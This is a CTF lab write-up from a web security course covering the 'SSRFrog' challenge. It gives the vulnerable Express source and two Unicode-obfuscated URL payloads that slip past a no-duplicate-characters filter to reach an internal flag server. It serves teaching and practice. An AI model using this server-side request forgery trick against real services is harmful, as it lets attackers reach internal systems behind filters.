---
title: Simple Web 0x13(Lab - SSRFrog)
tags: [NTUSTWS, CTF, Web]

category: "Security Course｜NTUST WS｜SSRF"
date: 2023-02-09
---

# Simple Web 0x13(Lab - SSRFrog)
<!-- more -->
###### tags: `NTUSTWS` `CTF` `Web`
Challenge: http://h4ck3r.quest:8501/

## Background
* [javascript Set()](https://pjchender.dev/javascript/js-set/)
* [Web Hacking \| 續章【EDU-CTF 2021】](https://youtu.be/hWC-Evt-sBc?t=9867)
* [網站安全🔒 伺服器端請求偽造 SSRF 攻擊 — 「項莊舞劍，意在沛公」](https://medium.com/程式猿吃香蕉/網站安全-伺服器請求偽造-ssrf-攻擊-項莊舞劍-意在沛公-7a5524926362)

## Source code
```javascript
const express = require("express");
const http = require("http");

const app = express();

app.get("/source", (req, res) => {
    return res.sendFile(__filename);
})
app.get('/', (req, res) => {
    const { url } = req.query;
    if (!url || typeof url !== 'string') return res.sendFile(__dirname + "/index.html");

    // no duplicate characters in `url`
    if (url.length !== new Set(url).size) return res.sendFile(__dirname + "/frog.png");

    try {
        http.get(url, resp => {
            resp.setEncoding("utf-8");
            resp.statusCode === 200 ? resp.on('data', data => res.send(data)) : res.send(":(");
        }).on('error', () => res.send("WTF?"));
    } catch (error) {
        res.send("WTF?");
    }
});

app.listen(3000, '0.0.0.0');
```
* Simply speaking, it'll call a `Set()` object that will filter duplicate characters
* We also can find the hint in page source
![](https://i.imgur.com/AxoVKnp.png)

## Exploit
1. The hint said flag is on `http://the.c0o0o0l-fl444g.server.internal:80`, so we need to meet the first requirement - every single character is unique.

    We can use [Domain Obfuscator](https://splitline.github.io/domain-obfuscator/) to replace the similar characters.
2. Payload
* `htTp:/\ⓉₕE．ℭ⓪ᴼ₀o０Ⅼ-Ⓕｌ₄4４ⓖ｡ₛⒺʳⓋₑⓇ.㏌ₜｅᴿ㎁ˡ`
* `htTp:/\ⓉｈE。Ⅽ⁰ₒ０O0ℓ-ｆᴸ④４⁴G．ＳＥRｖⅇⓡ.ⁱNｔₑrｎAℒ`

## Reference
* [SSRFrog](https://ctftime.org/writeup/25763)
* [Punycode converter](https://www.punycoder.com/)